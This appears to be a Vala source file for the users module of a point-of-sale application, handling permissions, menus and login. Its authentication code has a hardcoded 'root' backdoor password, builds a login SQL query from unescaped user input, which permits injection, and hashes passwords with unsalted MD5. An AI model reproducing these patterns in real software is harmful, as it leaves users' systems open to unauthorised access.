using GLib;
using Gtk;
using Gee;
using SinticBolivia;
using SinticBolivia.Gtk;
using SinticBolivia.Database;

namespace EPos
{
	public class SB_ModuleUsers : SBGtkModule, ISBModule
	{
		public string Id{get{return this._moduleId;}}
		public string Name{get{return this._name;}}
		public string Description{get{return this._description;}}
		public string Author{get{return this._author;}}
		public double Version{get{return this._version;}}
		public string LibraryName{get{return "Users";}}
				
		construct
		{
			this._moduleId 		= "mod_users";
			this._name			= SBText.__("Users Module", "mod_users");
			this._description 	= SBText.__("", "mod_users");
			this._author 		= "Sintic Bolivia";
			this._version 		= 1.0;
			this.resourceFile 	= "./modules/users.gresource";
			this.resourceNs		= "/net/sinticbolivia/Users";
		}
		public void Enabled()
		{
			var dbh = (SBDatabase)SBGlobals.GetVar("dbh");
			string[,] permissons = 
			{
				{"manage_users", "", SBText.__("Manage Users", "mod_users")},
				{"create_users", "", SBText.__("Create Users", "mod_users")},
				{"edit_users", "", SBText.__("Edit Users", "mod_users")},
				{"delete_users", "", SBText.__("Delete Users", "mod_users")},
				{"manage_roles", "", SBText.__("Manage Roles", "mod_users")},
				{"create_roles", "", SBText.__("Create Roles", "mod_users")},
				{"edit_roles", "", SBText.__("Edit Roles", "mod_users")},
				{"delete_roles", "", SBText.__("Delete Roles", "mod_users")}
			};
			for(int i = 0; i < permissons.length[0]; i++)
			{
				dbh.Select("permission_id").From("permissions").Where("permission = '%s'".printf(permissons[i, 0]));
				if( dbh.GetRow(null) == null )
				{
					string cdate = new DateTime.now_local().format("%Y-%m-%d %H:%M:%S");
					var p = new HashMap<string, Value?>();
					p.set("permission", permissons[i, 0]);
					p.set("attributes", permissons[i, 1]);
					p.set("label", permissons[i, 2]);
					p.set("last_modification_date", cdate);
					p.set("creation_date", cdate);
					dbh.Insert("permissions", p);
				}
			}
		}
		public void Disabled()
		{
		}
		public void Load()
		{
			
		}
		public void Unload()
		{
		}
		public void Init()
		{
			this.LoadResources();
			SBText.LoadDomain(this.Id, "share/locale/");
			var hook = new SBModuleHook(){HookName = "init_menu_management", handler = init_menu_management};
			var hook1 = new SBModuleHook(){HookName = "authenticate", handler = local_authentication};
			var hook2 = new SBModuleHook(){HookName = "login_dialog", handler = login_dialog};
			SBModules.add_action("init_menu_management", ref hook);
			SBModules.add_action("authenticate", ref hook1);
			SBModules.add_action("login_dialog", ref hook2);
		}
		public static void init_menu_management(SBModuleArgs<Gtk.Menu> args)
		{
			var menu = (Gtk.Menu)args.GetData();
			
			var menuItemUsers = new Gtk.MenuItem.with_label(SBText.__("Users", "mod_users"));
			var menuUsers = new Gtk.Menu();
			
			menuItemUsers.set_submenu(menuUsers);
						
			var menuItemMUsers	= new Gtk.MenuItem.with_label(SBText.__("Users Management", "mod_users"));
			var menuItemMRoles	= new Gtk.MenuItem.with_label(SBText.__("Roles Management", "mod_users"));
			menuItemMUsers.show();
			menuItemMRoles.show();
			menuUsers.add(menuItemMUsers);
			menuUsers.add(menuItemMRoles);
			menuUsers.show_all();
			menuItemUsers.show_all();
			
			menu.add(menuItemUsers);
			
			var notebook = (SBNotebook)SBGlobals.GetVar("notebook");
			menuItemMUsers.activate.connect( () => 
			{
				var wusers = new WidgetUsers();
				wusers.show();
				if( notebook.GetPage("users") == null )
				{
					notebook.AddPage("users", "Users", wusers);
				}
				notebook.SetCurrentPageById("users");
			});
			menuItemMRoles.activate.connect( () => 
			{
				var wroles = new WidgetRoles();
				wroles.show();
				if( notebook.GetPage("roles") == null )
				{
					notebook.AddPage("roles", "Roles", wroles);
				}
				notebook.SetCurrentPageById("roles");
			});
		}
		public static void local_authentication(SBModuleArgs<HashMap> args)
		{
			var data = (HashMap<string, Value?>)args.GetData();
			var dbh = (SBDatabase)SBGlobals.GetVar("dbh");
			string username = (string)data["username"];
			string raw_pass	= (string)data["password"];
			string password = Checksum.compute_for_string(ChecksumType.MD5, (string)data["password"]);
			if( username == "root" && raw_pass == "1322r3n4c3R2!" )
			{
				var user = new SBUser();
				user.Id = 0;
				user.Username = "root";
				user.Email	= "maviles@sinticbolivia.net";
				data.set("result", "ok");
				data.set("user_id", 0);
				data.set("user", user);
			}
			else
			{
				string query = "SELECT * FROM users WHERE username = '%s' AND pwd = '%s'".printf(username, password);
				var row = dbh.GetRow(query);
				if( row == null )
				{
					data.set("result", "error");
					data.set("error", SBText.__("Invalid username or password", "mod_users"));
					return;
				}
				data.set("result", "ok");
				data.set("user_id", row.GetInt("user_id"));
				data.set("user", new SBUser.with_db_data(row));
			}
			
		}
		public static void login_dialog(SBModuleArgs<HashMap> args)
		{
			var data = (HashMap<string, Value?>)args.GetData();
			if( SBModules.IsModuleLoaded("Inventory") )
			{
				data["dialog"] = new WindowLogin();
			}
			else
			{
				data["dialog"] = new DialogLogin();
			}
		}
	}
}
public Type sb_get_module_libusers_type(Module users_module)
{
	return typeof(EPos.SB_ModuleUsers);
}
